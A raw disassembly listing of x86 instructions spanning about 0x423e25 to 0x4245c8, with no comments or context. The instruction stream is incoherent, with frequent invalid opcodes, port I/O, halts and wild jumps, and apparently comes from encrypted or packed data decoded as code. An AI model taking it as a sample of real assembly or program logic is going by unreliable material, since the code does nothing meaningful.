  423e25:	call   DWORD PTR [eax]
  423e27:	repnz pop edx
  423e29:	int3   
  423e2a:	out    dx,eax
  423e2b:	mov    ds:0x5511b055,al
  423e30:	mov    ebx,0xb9be9c16
  423e35:	xchg   esi,eax
  423e36:	shr    BYTE PTR es:[esi],0x1f
  423e3a:	(bad)  
  423e3c:	xor    ecx,esi
  423e3e:	sahf   
  423e3f:	or     BYTE PTR [esi+0x1c],ah
  423e42:	fdivr  st(5),st
  423e44:	adc    eax,0xe3bc1e9f
  423e49:	jge    0x423ec7
  423e4b:	sahf   
  423e4c:	mov    ebp,0xa627d70
  423e51:	mov    ebp,0x59a0fc68
  423e56:	xchg   edi,eax
  423e57:	jle    0x423ed0
  423e59:	cmp    al,0xe4
  423e5b:	cs pop eax
  423e5d:	push   ebx
  423e5e:	xlat   BYTE PTR ds:[ebx]
  423e5f:	mov    BYTE PTR [ebp+0x7d6d403],0x48
  423e66:	mov    WORD PTR [ebp+0x155a3b18],ds
  423e6c:	clc    
  423e6d:	sbb    DWORD PTR [edi],edx
  423e6f:	cmp    bl,BYTE PTR [edi+0x1c]
  423e72:	ss in  eax,0x8e
  423e75:	shl    eax,1
  423e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e78:	add    edi,DWORD PTR [eax-0x5e0f1f]
  423e7e:	fxch   st(5)
  423e80:	leave  
  423e81:	xor    eax,0xc5126e
	...
  423e8e:	add    BYTE PTR [eax],al
  423e90:	add    BYTE PTR [ecx],dh
  423e92:	retf   
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0xffffffee
  423e9e:	mov    ecx,0xb69db4c4
  423ea3:	add    DWORD PTR [eax],eax
  423ea5:	lods   al,BYTE PTR ds:[esi]
  423ea6:	add    eax,DWORD PTR [eax]
  423ea8:	add    BYTE PTR [edi-0x7e],ch
  423eab:	shr    BYTE PTR [eax-0x1809ddc9],1
  423eb1:	pop    ecx
  423eb2:	pop    edi
  423eb3:	push   ebx
  423eb4:	inc    esp
  423eb5:	arpl   WORD PTR [edx+ecx*2-0x2822a219],ax
  423ebc:	jecxz  0x423ed5
  423ebe:	mov    ch,BYTE PTR [esi+ebp*2+0x18]
  423ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ec3:	daa    
  423ec4:	xchg   edi,eax
  423ec5:	out    dx,eax
  423ec6:	sbb    dh,ch
  423ec8:	aas    
  423ec9:	in     eax,0xcf
  423ecb:	sub    DWORD PTR [edx+0x51],ebx
  423ece:	mov    bh,0xa3
  423ed0:	push   eax
  423ed1:	sbb    al,0xe
  423ed3:	pop    esp
  423ed4:	popa   
  423ed5:	jge    0x423f3e
  423ed7:	pop    esp
  423ed8:	cmp    dl,BYTE PTR [eax+0xec8d856]
  423ede:	cmp    DWORD PTR [ecx+0xbb40028],eax
  423ee4:	pop    esi
  423ee5:	ror    esp,cl
  423ee7:	mov    dl,0x1
  423ee9:	int3   
  423eea:	xor    DWORD PTR [eax+0x2be2d15d],edx
  423ef0:	mov    DWORD PTR [eax+0x15f8e0da],ecx
  423ef6:	fbstp  TBYTE PTR [ebx+ebp*1]
  423ef9:	push   0xa
  423efb:	shl    DWORD PTR [esi],0xe8
  423efe:	and    ebp,0x19176cb8
  423f04:	mov    ds:0xee7390ca,eax
  423f09:	repnz mov bh,0x60
  423f0c:	or     DWORD PTR [edi],ebx
  423f0e:	inc    ebx
  423f0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f10:	test   al,0xba
  423f12:	mov    esp,0x589ff3b6
  423f17:	add    edi,DWORD PTR [ebp+0x35d4a4fb]
  423f1d:	xor    DWORD PTR [edi+0x3e6ccbe8],0x1f
  423f24:	shr    bl,1
  423f26:	pushf  
  423f27:	inc    ebx
  423f28:	mov    ecx,0x6bcb6b44
  423f2d:	mov    esp,0x698fa9b7
  423f32:	lahf   
  423f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f34:	int    0x69
  423f36:	lock dec edi
  423f38:	mov    ah,0xcb
  423f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f3b:	aam    0xc0
  423f3d:	sbb    bh,ch
  423f3f:	xor    eax,DWORD PTR [edi+edx*4]
  423f42:	dec    edx
  423f43:	add    al,0xfa
  423f45:	push   ss
  423f46:	mov    eax,0xa2049e91
  423f4b:	pop    es
  423f4c:	add    DWORD PTR [esi-0x59518e30],0xffffff81
  423f53:	fidivr DWORD PTR [ecx]
  423f55:	jecxz  0x423f58
  423f57:	sub    dl,BYTE PTR [edi+0x7b]
  423f5a:	sahf   
  423f5b:	dec    ebp
  423f5c:	sbb    BYTE PTR [edi],0x8c
  423f5f:	sub    al,0x1d
  423f61:	push   es
  423f62:	push   esp
  423f63:	jmp    0x4e3f:0xd5f71b34
  423f6a:	jl     0x423fa0
  423f6c:	push   0xd81299a
  423f71:	in     eax,dx
  423f72:	clc    
  423f73:	loopne 0x423f75
  423f75:	shr    DWORD PTR [edx-0x349d73a2],cl
  423f7b:	jmp    FWORD PTR [edx+0x76f6f6f9]
  423f81:	pop    ebx
  423f82:	sbb    edi,DWORD PTR [ecx-0x61497ed5]
  423f88:	adc    eax,0x42c5d816
  423f8d:	sub    DWORD PTR [ecx],0xf84fedb1
  423f93:	dec    edx
  423f94:	out    dx,eax
  423f95:	jmp    0x423f90
  423f97:	je     0x423ff9
  423f99:	pop    ecx
  423f9a:	add    ch,BYTE PTR [ecx]
  423f9c:	fld    QWORD PTR [eax]
  423f9e:	inc    edx
  423f9f:	addr16 inc edi
  423fa1:	(bad)  
  423fa2:	jmp    0x423fe7
  423fa4:	pop    edx
  423fa5:	aas    
  423fa6:	mov    esi,0xeedba8b5
  423fab:	aam    0x2a
  423fad:	or     ch,bl
  423faf:	and    DWORD PTR [edi-0x1e],ebx
  423fb2:	adc    DWORD PTR [ecx-0xa],ebx
  423fb5:	adc    edx,DWORD PTR ds:0xde6d06bf
  423fbb:	inc    esi
  423fbc:	fcomp  DWORD PTR [edx-0x2d62d783]
  423fc2:	push   edx
  423fc3:	xor    eax,0xf7590367
  423fc8:	dec    ebx
  423fc9:	stos   DWORD PTR es:[edi],eax
  423fca:	out    dx,al
  423fcb:	push   0x2f
  423fcd:	push   es
  423fce:	mov    ebx,0xca6abbb4
  423fd3:	mov    WORD PTR [edi+0x579a32e1],es
  423fd9:	inc    esi
  423fda:	clc    
  423fdb:	push   esp
  423fdc:	pop    ebp
  423fdd:	mov    gs,WORD PTR [eax]
  423fdf:	push   0x8658f974
  423fe4:	out    0x77,al
  423fe6:	(bad)  
  423fe7:	loopne 0x42401b
  423fe9:	ins    DWORD PTR es:[edi],dx
  423fea:	mov    eax,ds:0xa6932fdb
  423fef:	ds lahf 
  423ff1:	mov    ds:0xe6a954b0,al
  423ff6:	jecxz  0x423fbb
  423ff8:	pop    ecx
  423ff9:	adc    DWORD PTR [ecx-0x57c7494],0x3d
  424000:	leave  
  424001:	hlt    
  424002:	out    0x84,eax
  424004:	jno    0x423ffd
  424006:	xchg   ebp,eax
  424007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424008:	and    bh,BYTE PTR [esi-0x2fc9fe6b]
  42400e:	or     bh,ch
  424010:	mov    esi,0x55138612
  424015:	std    
  424016:	xchg   esi,eax
  424017:	sub    BYTE PTR [edi],ah
  424019:	jo     0x424033
  42401b:	inc    esp
  42401c:	or     BYTE PTR [edi-0x4d],ch
  42401f:	test   ch,al
  424021:	(bad)  [ebx-0x17]
  424024:	mov    dh,0x96
  424026:	(bad)  
  424027:	xchg   ebp,eax
  424028:	stos   BYTE PTR es:[edi],al
  424029:	pushf  
  42402a:	(bad)  
  42402b:	mov    dh,0x57
  42402d:	jecxz  0x423fe2
  42402f:	jp     0x42406f
  424031:	(bad)  
  424032:	dec    edx
  424033:	outs   dx,DWORD PTR ds:[esi]
  424034:	add    BYTE PTR ds:0x38cf37c6,0x40
  42403b:	outs   dx,DWORD PTR ds:[esi]
  42403c:	jo     0x424098
  42403e:	jbe    0x6d8f76f6
  424044:	jle    0x423ff9
  424046:	jp     0x423fde
  424048:	adc    eax,0x14e6c8ae
  42404d:	ja     0x42407f
  42404f:	lods   eax,DWORD PTR ds:[esi]
  424050:	cmp    DWORD PTR [eax],0x5
  424053:	mov    bh,0x63
  424055:	mov    esi,0xe23ce5d2
  42405a:	pusha  
  42405b:	loope  0x42401c
  42405d:	jecxz  0x4240d9
  42405f:	shr    esi,1
  424061:	(bad)  
  424063:	lock cmp al,0x18
  424066:	xchg   esp,eax
  424067:	mov    ecx,0xbcb757b8
  42406c:	pusha  
  42406d:	sbb    ebx,DWORD PTR [esi-0x5dc78432]
  424073:	inc    ebx
  424074:	stos   BYTE PTR es:[edi],al
  424075:	dec    esi
  424076:	ja     0x424046
  424078:	and    eax,0xd7bb0ac6
  42407d:	retf   0x9c75
  424080:	sub    eax,0x937df9ef
  424085:	out    0xa1,eax
  424087:	lods   eax,DWORD PTR es:[esi]
  424089:	das    
  42408a:	push   edx
  42408b:	push   ds
  42408c:	jl     0x42404f
  42408e:	stc    
  42408f:	xor    eax,DWORD PTR [edx]
  424091:	mov    DWORD PTR [ecx],ebp
  424093:	sub    eax,0x5052f825
  424098:	(bad)  
  42409a:	xlat   BYTE PTR ds:[ebx]
  42409b:	sahf   
  42409c:	add    al,BYTE PTR [bp+0x2423]
  4240a1:	stos   DWORD PTR es:[edi],eax
  4240a2:	sub    DWORD PTR [ecx-0x26],ebp
  4240a5:	mov    ds:0xac97ddbb,eax
  4240aa:	cmp    edx,DWORD PTR [ebp+0x58]
  4240ad:	test   BYTE PTR [ecx-0x4b023ad8],al
  4240b3:	test   al,0x83
  4240b5:	sbb    dh,bl
  4240b7:	rol    BYTE PTR fs:[eax],0x10
  4240bb:	mov    ecx,0xc749014d
  4240c0:	sbb    eax,0x5e8584c9
  4240c5:	or     al,0x1c
  4240c7:	shl    DWORD PTR [ebx+edi*8-0x51],cl
  4240cb:	mov    ah,0x39
  4240cd:	in     al,0xb
  4240cf:	inc    edx
  4240d0:	data16 arpl WORD PTR [ecx+0x1],dx
  4240d4:	adc    al,0x41
  4240d6:	in     al,dx
  4240d7:	adc    DWORD PTR [ecx],esi
  4240d9:	pop    eax
  4240da:	add    ebx,DWORD PTR [ebp-0x6c]
  4240dd:	push   ecx
  4240de:	xchg   edx,eax
  4240df:	push   0x348fe725
  4240e4:	ficomp WORD PTR [eax]
  4240e6:	in     al,dx
  4240e7:	in     al,0x72
  4240e9:	mov    bl,0x3a
  4240eb:	enter  0xc8ae,0x4d
  4240ef:	loopne 0x42409d
  4240f1:	mov    al,0x93
  4240f3:	cmp    eax,0x2f97c3d7
  4240f8:	or     al,0x2d
  4240fa:	lods   eax,DWORD PTR ds:[esi]
  4240fb:	dec    ebp
  4240fc:	pop    esi
  4240fd:	mov    ebp,0x899fca6d
  424102:	in     eax,0x36
  424104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424105:	pop    edx
  424106:	sahf   
  424107:	cmp    esp,eax
  424109:	(bad)  
  42410a:	lahf   
  42410b:	and    DWORD PTR [eax+0x7],esi
  42410e:	pusha  
  42410f:	sbb    edi,DWORD PTR [eax+0x16a3f04f]
  424115:	shl    DWORD PTR [si-0x5e],cl
  424119:	dec    esi
  42411a:	mov    eax,ds:0x3e38d8b4
  42411f:	mov    dh,BYTE PTR [edi]
  424121:	sub    ebx,edi
  424123:	sahf   
  424124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424125:	aaa    
  424126:	enter  0x262a,0xf5
  42412a:	mov    bl,BYTE PTR [eax+0x6b]
  42412d:	mul    ebp
  42412f:	cmp    ebp,esp
  424131:	and    bh,BYTE PTR [edi]
  424133:	xchg   ch,dl
  424135:	push   0x5fbad633
  42413a:	gs cli 
  42413c:	push   ecx
  42413d:	scas   eax,DWORD PTR es:[edi]
  42413e:	mov    ds:0x6d05baef,eax
  424143:	mov    dl,0xc2
  424145:	test   al,0x5d
  424147:	jne    0x42411b
  424149:	das    
  42414a:	scas   eax,DWORD PTR es:[edi]
  42414b:	outs   dx,BYTE PTR ds:[esi]
  42414c:	stos   BYTE PTR es:[edi],al
  42414d:	nop
  42414e:	mov    esp,0xc4e4a048
  424153:	lock sbb BYTE PTR ds:0x6dab5b2b,bl
  42415a:	int    0xac
  42415c:	aas    
  42415d:	pop    eax
  42415e:	rcr    ebp,1
  424160:	jl     0x424143
  424162:	ret    
  424163:	scas   al,BYTE PTR es:[edi]
  424164:	cdq    
  424165:	sub    eax,0x9246c449
  42416a:	sub    ebx,0x13024915
  424170:	fcmovnu st,st(4)
  424172:	pop    ebp
  424173:	mov    ecx,0xdc68bb30
  424178:	jmp    0x42412e
  42417a:	outs   dx,DWORD PTR ds:[esi]
  42417b:	mov    bh,0xab
  42417d:	aam    0x45
  42417f:	es cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  424182:	outs   dx,DWORD PTR ds:[esi]
  424183:	hlt    
  424184:	iret   
  424185:	add    cl,BYTE PTR [ecx+0x37]
  424188:	jnp    0x4241de
  42418a:	mov    eax,ds:0xa43a6bb
  42418f:	inc    edi
  424190:	dec    ecx
  424191:	adc    al,0x69
  424193:	mov    edi,0xf99618e6
  424198:	in     al,0x4b
  42419a:	(bad)  
  42419b:	adc    eax,DWORD PTR [esi+0x58b3f457]
  4241a1:	jp     0x42415a
  4241a3:	neg    ch
  4241a5:	lock (bad) 
  4241a7:	fcomp  QWORD PTR [ebx]
  4241a9:	ret    
  4241aa:	fdiv   QWORD PTR [ebp+0xb]
  4241ad:	add    bl,ah
  4241af:	stc    
  4241b0:	icebp  
  4241b1:	mov    al,0xfe
  4241b3:	jb     0x424152
  4241b5:	mov    al,ds:0xa78323fe
  4241ba:	fcom   QWORD PTR [ebp+0x56]
  4241bd:	aam    0xf0
  4241bf:	mov    ds,WORD PTR [edx-0xd]
  4241c2:	mov    DWORD PTR [esi+0x3d3fe3a0],ecx
  4241c8:	stos   BYTE PTR es:[edi],al
  4241c9:	les    edx,FWORD PTR [ecx]
  4241cb:	stos   BYTE PTR es:[edi],al
  4241cc:	lods   al,BYTE PTR ds:[esi]
  4241cd:	scas   eax,DWORD PTR es:[edi]
  4241ce:	cdq    
  4241cf:	clc    
  4241d0:	pusha  
  4241d1:	outs   dx,BYTE PTR ds:[esi]
  4241d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241d3:	add    DWORD PTR ds:0x85c9b2e7,0x1523829a
  4241dd:	mov    edx,0xb947b137
  4241e2:	pop    esi
  4241e3:	cmp    esi,ecx
  4241e5:	cmp    esi,edx
  4241e7:	in     al,0xab
  4241e9:	addr16 dec edx
  4241eb:	clc    
  4241ec:	in     eax,dx
  4241ed:	mov    ah,0x17
  4241ef:	add    dl,dh
  4241f1:	mov    edi,0x92051bae
  4241f6:	or     BYTE PTR [ebx+0x74],bl
  4241f9:	xlat   BYTE PTR ds:[ebx]
  4241fa:	jl     0x4241d0
  4241fc:	pop    ecx
  4241fd:	inc    ebx
  4241fe:	sub    al,0x13
  424200:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  424202:	mov    al,BYTE PTR [edx+0x79]
  424205:	mov    al,0xee
  424207:	sub    eax,0xb2f48b36
  42420c:	mov    gs,WORD PTR [ebx+eax*8+0x102f2878]
  424213:	inc    edx
  424214:	xchg   esi,eax
  424215:	ins    DWORD PTR es:[edi],dx
  424216:	add    BYTE PTR [esi+0xe],dl
  424219:	sub    dh,bl
  42421b:	sub    DWORD PTR [edi+eax*4-0x64],edi
  42421f:	xchg   esi,eax
  424220:	shl    BYTE PTR [edx],0x90
  424223:	pop    es
  424224:	dec    edi
  424225:	mov    ebp,0x31bb9b57
  42422a:	pop    ds
  42422b:	inc    dx
  42422d:	lds    ebx,FWORD PTR [ebp+0x37]
  424230:	mov    WORD PTR [ebp+0x79],gs
  424233:	pushf  
  424234:	mov    esi,0xc3a067bd
  424239:	aad    0x19
  42423b:	pop    ecx
  42423c:	or     ebx,eax
  42423e:	mov    eax,ds:0x5476a837
  424243:	pop    esp
  424244:	mov    edi,DWORD PTR [edx-0x2acabb3b]
  42424a:	scas   al,BYTE PTR es:[edi]
  42424b:	fdiv   QWORD PTR [edi-0x12bcf179]
  424251:	out    0xb3,al
  424253:	push   esi
  424254:	sub    DWORD PTR [eax],eax
	...
  42425e:	add    BYTE PTR [eax],al
  424260:	add    bh,dh
  424262:	in     eax,0x9f
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi+0x60ae212c],1
  42426f:	bound  ebp,QWORD PTR [ebx]
  424271:	dec    ecx
  424272:	mov    edx,0x3ac0001
  424277:	add    BYTE PTR [eax],al
  424279:	cdq    
  42427a:	lock mov ah,0x23
  42427d:	in     eax,0xf6
  42427f:	cld    
  424280:	test   BYTE PTR [edi],dh
  424282:	sti    
  424283:	call   0x534:0x5e9c32e9
  42428a:	imul   ecx,DWORD PTR [ebx],0x675cd5d9
  424290:	inc    esi
  424291:	sahf   
  424292:	popa   
  424293:	nop
  424294:	mov    DWORD PTR [eax-0x3b136cd7],edi
  42429a:	push   edi
  42429b:	pop    esp
  42429c:	loope  0x424234
  42429e:	jnp    0x4242bb
  4242a0:	out    dx,al
  4242a1:	sahf   
  4242a2:	cwde   
  4242a3:	mov    dl,0x0
  4242a5:	pop    ebp
  4242a6:	mov    DWORD PTR [ebp-0x3f],edi
  4242a9:	jecxz  0x42424f
  4242ab:	inc    eax
  4242ac:	and    DWORD PTR [edx-0x1094f21c],esp
  4242b2:	jb     0x424260
  4242b4:	sbb    ecx,edx
  4242b6:	pop    edi
  4242b7:	jecxz  0x424268
  4242b9:	outs   dx,DWORD PTR ds:[esi]
  4242ba:	ret    
  4242bb:	xor    al,bl
  4242bd:	mov    ds:0x9ed840da,al
  4242c2:	repz scas al,BYTE PTR es:[edi]
  4242c4:	adc    eax,0x92dc48ca
  4242c9:	mov    eax,0xd10c1219
  4242ce:	xor    eax,0xa3abb99b
  4242d3:	adc    eax,0xbdc2a703
  4242d8:	in     al,0xd0
  4242da:	push   ss
  4242db:	pop    ecx
  4242dc:	call   0xb21a8989
  4242e1:	in     eax,dx
  4242e2:	mov    cl,0x72
  4242e4:	mov    ah,0x94
  4242e6:	into   
  4242e7:	mov    dh,0x78
  4242e9:	or     BYTE PTR [edx],al
  4242eb:	ja     0x424307
  4242ed:	test   eax,0xefb012dd
  4242f2:	(bad)  
  4242f3:	cmp    ecx,ebp
  4242f5:	mov    edi,0x9a04db3f
  4242fa:	ret    
  4242fb:	inc    eax
  4242fc:	jne    0x424375
  4242fe:	mov    dh,0x6a
  424300:	imul   ebx
  424302:	jecxz  0x424337
  424304:	push   ebx
  424305:	and    al,0x6f
  424307:	out    0xf4,eax
  424309:	rcr    dh,0x16
  42430c:	push   edx
  42430d:	adc    eax,DWORD PTR [eax]
  42430f:	add    DWORD PTR [ecx+0x204b0c7e],edi
  424315:	out    0x25,eax
  424317:	fcomp  DWORD PTR [eax+ecx*2+0x6fc560f9]
  42431e:	aas    
  42431f:	mov    dh,dl
  424321:	int    0x9f
  424323:	xchg   esi,eax
  424324:	sbb    DWORD PTR [ecx],eax
  424326:	out    0x94,eax
  424328:	mov    eax,ds:0xf967ceb
  42432d:	das    
  42432e:	add    eax,0x4a593a7a
  424333:	dec    edi
  424334:	jo     0x424333
  424336:	imul   eax,DWORD PTR [edi+0x5d],0x3321f921
  42433d:	pop    edx
  42433e:	mov    esp,0x6f462114
  424343:	enter  0x1e77,0x8a
  424347:	hlt    
  424348:	mov    DWORD PTR gs:[ebp+ecx*4-0x1a8fa0cc],ebx
  424350:	sti    
  424351:	ss add ecx,ebp
  424354:	xlat   BYTE PTR ds:[ebx]
  424355:	out    dx,eax
  424356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424357:	call   0xad8b4942
  42435c:	mov    ds:0xa845fafd,al
  424361:	rcr    DWORD PTR [ebx],1
  424363:	xchg   ebx,eax
  424364:	repz push ss
  424366:	mov    BYTE PTR [ebx+esi*2+0x2b],ah
  42436a:	ss mov al,0x9b
  42436d:	repnz cld 
  42436f:	repnz stos BYTE PTR es:[edi],al
  424371:	hlt    
  424372:	push   es
  424373:	stos   BYTE PTR es:[edi],al
  424374:	in     eax,dx
  424375:	(bad)  
  424376:	dec    edi
  424377:	jge    0x424371
  424379:	cmp    BYTE PTR [ebx+0x64],cl
  42437c:	mov    bl,0x5a
  42437e:	or     ebx,DWORD PTR [ebp+0x4135edde]
  424384:	sbb    DWORD PTR [edx+edi*4],esi
  424387:	jo     0x42431b
  424389:	or     DWORD PTR [ebp+0x1a],0x3a
  42438d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42438e:	scas   al,BYTE PTR es:[edi]
  42438f:	pmaddwd mm4,QWORD PTR [edi]
  424392:	sub    ch,bl
  424394:	mov    bh,0xee
  424396:	sbb    ebx,ebp
  424398:	ror    cl,0xf8
  42439b:	cmp    BYTE PTR [ebx+0x4b],bl
  42439e:	in     al,0xec
  4243a0:	cmp    eax,0x64a763e2
  4243a5:	inc    ecx
  4243a6:	sub    eax,0x75ba15ef
  4243ab:	leave  
  4243ac:	mov    ch,0x75
  4243ae:	add    DWORD PTR [ebx-0x5a],0x2a5d8325
  4243b5:	or     eax,0xf5c7ce54
  4243ba:	mov    edi,DWORD PTR [edi]
  4243bc:	mov    eax,DWORD PTR [edi+0x7232869]
  4243c2:	xor    dl,BYTE PTR [ebx+edi*8-0x47]
  4243c6:	sub    edx,DWORD PTR [ebx+0x26]
  4243c9:	sbb    eax,0x3efca3d6
  4243ce:	mov    ebp,0x8ffe2c0b
  4243d3:	hlt    
  4243d4:	or     ebp,DWORD PTR ds:0xb74898d5
  4243da:	shl    BYTE PTR [ecx-0x56aed21a],cl
  4243e0:	pop    ds
  4243e1:	dec    ecx
  4243e2:	in     al,0x3
  4243e4:	ja     0x424461
  4243e6:	push   edi
  4243e7:	arpl   WORD PTR [ebx+eax*2],sp
  4243ea:	adc    bl,BYTE PTR [edi+eiz*8]
  4243ed:	sbb    DWORD PTR [edx-0x6e2ac29b],0xd7852f6b
  4243f7:	dec    esi
  4243f8:	cmp    esp,DWORD PTR [edx+0x7b]
  4243fb:	push   edi
  4243fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243fd:	sbb    BYTE PTR [ecx-0x20],ah
  424400:	adc    eax,0x8a148513
  424405:	test   BYTE PTR fs:[ebx-0x1],ch
  424409:	leave  
  42440a:	pop    ds
  42440b:	inc    esp
  42440c:	xchg   ebx,eax
  42440d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42440e:	cmp    dl,bl
  424410:	fst    QWORD PTR [edi-0x6c]
  424413:	ror    BYTE PTR [esi+0x27],cl
  424416:	jae    0x4243a3
  424418:	mov    ebx,0x63147ad6
  42441d:	push   0x7e
  42441f:	fist   DWORD PTR [esi-0x1ddebee9]
  424425:	aad    0x42
  424427:	sub    eax,0xa7464f90
  42442c:	rcr    DWORD PTR [esi],0xcb
  42442f:	int3   
  424430:	into   
  424431:	inc    eax
  424432:	inc    ebx
  424433:	add    ebx,esi
  424435:	pop    esi
  424436:	xchg   edx,eax
  424437:	sbb    DWORD PTR [esi],0x40a9d542
  42443d:	fdivr  DWORD PTR [ebp-0x7d50a484]
  424443:	pop    ds
  424444:	push   ebp
  424445:	cli    
  424446:	jmp    0x424429
  424448:	push   ds
  424449:	cmp    eax,0x17735765
  42444e:	xor    dl,0x10
  424451:	(bad)  
  424452:	lds    ebp,FWORD PTR [edx]
  424454:	sub    edi,DWORD PTR [eax]
  424456:	(bad)  
  424457:	xchg   edi,eax
  424458:	jg     0x42440d
  42445a:	pusha  
  42445b:	enter  0x21f6,0x78
  42445f:	daa    
  424460:	je     0x42447a
  424462:	push   cs
  424463:	(bad)  
  424464:	int3   
  424465:	mov    ah,0xa4
  424467:	and    ebp,ebp
  424469:	sbb    ah,BYTE PTR [esi+0x2a73c2f1]
  42446f:	sar    BYTE PTR [ecx+0x38],0xd1
  424473:	xor    ch,BYTE PTR [esi+0x52]
  424476:	clc    
  424477:	out    dx,eax
  424478:	mov    ebp,0x4c7dd9f9
  42447d:	stos   BYTE PTR es:[edi],al
  42447e:	fs test ah,bh
  424481:	nop
  424482:	sahf   
  424483:	das    
  424484:	dec    ebp
  424485:	in     al,dx
  424486:	arpl   cx,dx
  424488:	inc    ebx
  424489:	pop    ecx
  42448a:	xor    dh,dh
  42448c:	aad    0x1c
  42448e:	jbe    0x4244f6
  424490:	scas   eax,DWORD PTR es:[edi]
  424491:	scas   al,BYTE PTR es:[edi]
  424492:	add    BYTE PTR [ebx-0x212af682],dl
  424498:	inc    ecx
  424499:	fstp   QWORD PTR [ebx]
  42449b:	pop    ebp
  42449c:	repz jno 0x424492
  42449f:	mov    ds,WORD PTR [ecx+0x7a]
  4244a2:	dec    ecx
  4244a3:	sti    
  4244a4:	retf   
  4244a5:	xchg   cx,ax
  4244a7:	add    bl,bh
  4244a9:	and    DWORD PTR [ecx],ebx
  4244ab:	neg    BYTE PTR [ecx]
  4244ad:	stos   BYTE PTR es:[edi],al
  4244ae:	xchg   ecx,eax
  4244af:	dec    ecx
  4244b0:	xor    al,0xde
  4244b2:	loopne 0x424506
  4244b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b5:	fisttp QWORD PTR [ecx]
  4244b7:	pop    eax
  4244b8:	mov    ds:0x515cf4d0,eax
  4244bd:	(bad)  
  4244be:	aas    
  4244bf:	pop    esi
  4244c0:	dec    esp
  4244c1:	xlat   BYTE PTR ds:[ebx]
  4244c2:	inc    edi
  4244c3:	lahf   
  4244c4:	xchg   esp,eax
  4244c5:	jmp    0x46d74b6a
  4244ca:	mov    bh,0x2
  4244cc:	les    eax,FWORD PTR [eax+eax*1+0x4c]
  4244d0:	int    0xe
  4244d2:	mov    ah,0xdf
  4244d4:	imul   ch
  4244d6:	fld    DWORD PTR [ebp-0x482c0838]
  4244dc:	mov    BYTE PTR [esi+0xd],cl
  4244df:	iret   
  4244e0:	adc    edi,edi
  4244e2:	pop    eax
  4244e3:	push   edi
  4244e4:	fidiv  WORD PTR [esi-0x6417aec9]
  4244ea:	add    cl,BYTE PTR [esi+0x34]
  4244ed:	push   0xffffff95
  4244ef:	pop    ecx
  4244f0:	mov    cl,0x64
  4244f2:	out    0x9d,eax
  4244f4:	lods   eax,DWORD PTR ds:[esi]
  4244f5:	push   0x2
  4244f7:	not    DWORD PTR [edi]
  4244f9:	mov    ds:0x2c097d62,al
  4244fe:	ficom  WORD PTR [ebx+ebx*1+0xc8bad3]
  424505:	mov    ah,0x90
  424507:	shl    BYTE PTR [edi],1
  424509:	xor    BYTE PTR [eax+0x37],ah
  42450c:	and    ebp,DWORD PTR [ecx+0x6de890da]
  424512:	xchg   esp,eax
  424513:	bound  eax,QWORD PTR [esi-0x1e0e9c7c]
  424519:	(bad)  
  42451a:	mov    DWORD PTR [ebx],ebx
  42451c:	outs   dx,BYTE PTR ds:[esi]
  42451d:	push   esi
  42451e:	and    ebp,esp
  424520:	jp     0x4244c4
  424522:	test   eax,0xfa9b628
  424527:	repnz sbb esi,edx
  42452a:	ror    BYTE PTR [ebx+0xe],cl
  42452d:	es push 0xffffff8d
  424530:	mov    edi,DWORD PTR [eax]
  424532:	leave  
  424533:	ins    DWORD PTR es:[edi],dx
  424534:	xchg   ebp,eax
  424535:	xchg   ecx,eax
  424536:	mov    esp,0xb499d025
  42453b:	outs   dx,DWORD PTR ds:[esi]
  42453c:	ret    0x511f
  42453f:	mov    al,ds:0xbcf1d831
  424544:	jae    0x424577
  424546:	je     0x424515
  424548:	(bad)  
  424549:	cmc    
  42454a:	and    ch,BYTE PTR [eax+ebp*1-0x3d]
  42454e:	(bad)  
  42454f:	cmp    ch,bh
  424551:	call   0x2b34ce6b
  424556:	push   esi
  424557:	xchg   BYTE PTR [ebx-0x6be22f87],ah
  42455d:	into   
  42455e:	(bad)  
  42455f:	fld    TBYTE PTR [esi]
  424561:	mov    ch,dl
  424563:	rcl    ch,1
  424565:	imul   ebx,DWORD PTR ds:0x4f2e2f3,0xffffffcc
  42456c:	inc    esi
  42456d:	addr16 aaa 
  42456f:	xchg   esp,eax
  424570:	in     al,dx
  424571:	mov    ebx,0xf73da835
  424576:	mov    bl,0x7f
  424578:	ds pop edx
  42457a:	mov    al,0xf1
  42457c:	popf   
  42457d:	ss lahf 
  42457f:	add    DWORD PTR [ebx],ebp
  424581:	fwait
  424582:	cmp    BYTE PTR [ecx+0x7d],bl
  424585:	jno    0x424585
  424587:	inc    eax
  424588:	repz cmp ah,BYTE PTR [ecx-0x5aa379df]
  42458f:	(bad)  
  424590:	fidivr DWORD PTR [eax]
  424592:	and    bl,BYTE PTR [ecx+0x64]
  424595:	mov    bh,cl
  424597:	ret    0xd6f7
  42459a:	or     BYTE PTR [ebx+0x5ba258d0],ah
  4245a0:	mov    cs,WORD PTR [ecx]
  4245a2:	add    ah,cl
  4245a4:	sbb    al,0x77
  4245a6:	call   0xa16d:0x5ab0f3b
  4245ad:	in     eax,dx
  4245ae:	jns    0x4245cc
  4245b0:	pop    ebp
  4245b1:	pop    edi
  4245b2:	popa   
  4245b3:	(bad)  
  4245b4:	icebp  
  4245b5:	neg    BYTE PTR [esi+0x618eaffd]
  4245bb:	inc    ebx
  4245bc:	cmp    eax,0xea7373f4
  4245c1:	aam    0x23
  4245c3:	mov    esp,0xbe9e5375
  4245c8:	mov    ah,0x16
